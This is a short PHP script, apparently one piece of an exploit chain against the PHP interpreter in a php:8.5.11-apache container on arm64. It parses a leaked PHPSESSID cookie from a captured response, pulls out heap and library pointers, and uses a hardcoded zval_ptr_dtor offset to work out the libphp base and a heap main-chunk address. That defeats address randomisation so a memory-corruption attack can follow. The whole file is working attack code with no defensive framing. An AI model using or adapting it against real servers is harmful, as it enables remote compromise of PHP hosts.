<?php
declare(strict_types=1);
/* arm64 (52-bit VA) calibration of parse_leak.php for php:8.5.11-apache.
 * zval_ptr_dtor offset = 0x761b80 (low12 = 0xb80); libphp = qword - 0x761b80.
 * arm user pointers observed ~0x00fe06... / 0x00ffff...; range 0xf00000000000..0x1000000000000. */
$file = $argv[1] ?? '/tmp/off_leak.resp';
$DTOR_OFF = 0x761b80; $DTOR_LOW = 0xb80;
$LO = 0xf00000000000; $HI = 0x1000000000000;
$raw = @file_get_contents($file);
if ($raw === false || !preg_match('/Set-Cookie:\s*PHPSESSID=([^;\r\n]*)/i', $raw, $m)) {
    fwrite(STDERR, "parse_leak: no Set-Cookie in $file\n"); exit(1);
}
$d = rawurldecode($m[1]);
$counts = []; $buckets = []; $n = strlen($d);
for ($o = 0; $o + 8 <= $n; $o++) {
    $q = unpack('P', substr($d, $o, 8))[1];
    if ($q > $LO && $q < $HI) {
        $k = sprintf('%016x', $q); $counts[$k] = ($counts[$k] ?? 0) + 1;
        $b = sprintf('%016x', $q & ~0x1FFFFF); $buckets[$b] = ($buckets[$b] ?? 0) + 1;
    }
}
if (!$counts || !$buckets) { fwrite(STDERR, "parse_leak: no heap pointers\n"); exit(1); }
arsort($counts); arsort($buckets);
$dtor = 0;
foreach ($counts as $k => $c) { $x = hexdec($k); if (($x & 0xFFF) === $DTOR_LOW) { $dtor = $x; break; } }
if ($dtor === 0) { fwrite(STDERR, "parse_leak: no zval_ptr_dtor candidate\n"); exit(1); }
$lib = $dtor - $DTOR_OFF; $lib_bucket = $dtor & ~0x1FFFFF;
$i = 0; $main = 0;
foreach ($buckets as $k => $c) {
    $b = hexdec($k);
    if ($i++ === 0) { continue; }
    if ($b === $lib_bucket) { continue; }
    if ($c >= 50 && abs($b - $lib) < 0x4000000) { $main = $b; break; }
}
if ($main === 0) { fwrite(STDERR, "parse_leak: no main-chunk candidate\n"); exit(1); }
printf("%x %x\n", $main, $lib);
